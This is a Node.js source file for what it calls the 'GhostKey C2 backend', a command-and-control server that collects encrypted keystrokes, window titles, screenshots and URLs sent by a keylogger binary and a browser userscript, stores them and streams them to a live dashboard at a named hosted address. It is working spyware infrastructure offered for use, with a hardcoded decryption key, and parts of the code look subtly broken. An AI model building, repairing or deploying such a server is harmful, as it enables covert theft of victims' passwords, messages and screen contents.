// server.js – GhostKey C2 backend (works on Render 2025)
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const CryptoJS = require('crypto-js');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();                     // ← THIS LINE WAS MISSING BEFORE
const PORT = process.env.PORT || 3000;

// YOUR KEY – must match the Go binary!
const AES_KEY = "x93mK!qWeR7zL9p&2vN8bT5cY4fU6jH0";

// Serve dashboard
app.use(express.static(path.join(__dirname, 'public')));
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));   // important for big screenshots

// In-memory DB (change to file later if you want persistence)
const db = new sqlite3.Database(':memory:');
db.run(`CREATE TABLE IF NOT EXISTS logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ts TEXT,
  client TEXT,
  win TEXT,
  keys TEXT,
  screenshot TEXT,
  url TEXT
)`);

// Decrypt function (matches Go AES-GCM)
function decrypt(b64) {
  try {
    const encrypted = CryptoJS.enc.Base64.parse(b64);
    const decrypted = CryptoJS.AES.decrypt({ ciphertext: encrypted }, CryptoJS.enc.Utf8.parse(AES_KEY), {
      iv: CryptoJS.lib.WordArray.create(encrypted.words.slice(0, 4)),  // GCM nonce is first 12 bytes
      mode: CryptoJS.mode.GCM,
      padding: CryptoJS.pad.NoPadding
    });
    return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
  } catch (e) {
    console.error("Decrypt failed:", e.message);
    return null;
  }
}

// Legacy endpoint for your old userscript
app.post('/log', (req, res) => {
  const { client = "unknown", url = "N/A", keys = [] } = req.body;
  const ts = new Date().toISOString().replace("T", " ").slice(0,19);
  const payload = { client, ts, win: "Browser", keys, screenshot: "", url };
  db.run("INSERT INTO logs (ts,client,win,keys,screenshot,url) VALUES (?,?,?,?,?,?)",
    [payload.ts, payload.client, payload.win, JSON.stringify(payload.keys), "", payload.url]);
  res.json({ success: true });
});

// New endpoint for GhostKey native binary
app.post('/ghost', (req, res) => {
  const { data } = req.body;
  if (!data) return res.status(400).json({ error: "no data" });

  const decrypted = decrypt(data);
  if (!decrypted) return res.status(400).json({ error: "decrypt failed" });

  const payload = {
    client: decrypted.client || "unknown",
    ts: decrypted.ts || new Date().toISOString().replace("T"," ").slice(0,19),
    win: decrypted.win || "Unknown Window",
    keys: Array.isArray(decrypted.keys) ? decrypted.keys : [],
    screenshot: decrypted.Screenshot || "",
    url: "Native App"
  };

  db.run("INSERT INTO logs (ts,client,win,keys,screenshot,url) VALUES (?,?,?,?,?,?)",
    [payload.ts, payload.client, payload.win, JSON.stringify(payload.keys), payload.screenshot, payload.url]);

  console.log(`Logged: ${payload.client} – ${payload.win} – ${payload.keys.length} keys${payload.screenshot?" + screenshot":""}`);
  res.json({ success: true });
});

// SSE stream for dashboard
app.get('/stream', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive'
  });
  res.flushHeaders();

  const send = (row) => {
    try {
      const payload = {
        client: row.client,
        ts: row.ts,
        win: row.win,
        keys: JSON.parse(row.keys),
        Screenshot: row.screenshot,
        url: row.url
      };
      res.write(`data: ${JSON.stringify(payload)}\n\n`);
    } catch (e) {}
  };

  // Send existing logs
  db.all("SELECT * FROM logs ORDER BY id DESC LIMIT 50", (err, rows) => {
    rows.reverse().forEach(send);
  });

  // Listen for new logs
  db.on('change', () => {
    db.all("SELECT * FROM logs ORDER BY id DESC LIMIT 1", (err, rows) => {
      if (rows[0]) send(rows[0]);
    });
  });
});

app.listen(PORT, () => {
  console.log(`GhostKey C2 running on port ${PORT}`);
  console.log(`Dashboard → https://fs-tracker-online.onrender.com`);
});